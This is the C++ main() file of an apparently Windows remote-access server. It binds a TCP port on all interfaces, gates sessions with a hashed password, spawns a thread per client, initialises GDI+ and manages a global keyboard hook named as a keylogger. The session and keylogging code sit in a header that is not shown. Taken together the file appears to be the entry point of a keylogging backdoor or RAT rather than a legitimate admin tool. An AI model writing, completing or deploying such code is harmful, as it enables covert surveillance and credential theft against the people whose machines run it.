#include "ServerCore.h"
#include <vector>

int main(int Argc, char *Argv[]) {
  if (Argc < 3)
    return 1;

  int Port = atoi(Argv[1]);
  G_StoredHash = Sha256(Argv[2]);

  srand((unsigned int)time(NULL));

  WSADATA WsaData;
  if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0)
    return 1;

  GdiplusStartupInput GdiInput;
  GdiplusStartup(&G_GdiplusToken, &GdiInput, NULL);

  SOCKET ListenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (ListenSock == INVALID_SOCKET) {
    WSACleanup();
    return 1;
  }

  sockaddr_in Addr = {};
  Addr.sin_family = AF_INET;
  Addr.sin_addr.s_addr = INADDR_ANY;
  Addr.sin_port = htons((u_short)Port);

  if (bind(ListenSock, (sockaddr *)&Addr, sizeof(Addr)) == SOCKET_ERROR) {
    closesocket(ListenSock);
    WSACleanup();
    return 1;
  }

  if (listen(ListenSock, SOMAXCONN) == SOCKET_ERROR) {
    closesocket(ListenSock);
    WSACleanup();
    return 1;
  }

  std::vector<std::thread> ClientThreads;

  while (1) {
    sockaddr_in ClientAddr = {};
    int AddrLen = sizeof(ClientAddr);
    SOCKET ClientSock = accept(ListenSock, (sockaddr *)&ClientAddr, &AddrLen);
    if (ClientSock == INVALID_SOCKET) {
      continue;
    }

    char ClientIp[64];
    inet_ntop(AF_INET, &ClientAddr.sin_addr, ClientIp, sizeof(ClientIp));

    ClientThreads.emplace_back(
        std::thread([ClientSock, ClientIp]() { HandleSession(ClientSock); }));

    ClientThreads.back().detach();
  }

  closesocket(ListenSock);

  if (G_KeylogHook) {
    G_KeylogActive = false;
    UnhookWindowsHookEx(G_KeylogHook);
  }
  if (G_KeylogThread.joinable())
    G_KeylogThread.join();

  GdiplusShutdown(G_GdiplusToken);
  WSACleanup();
  return 0;
}
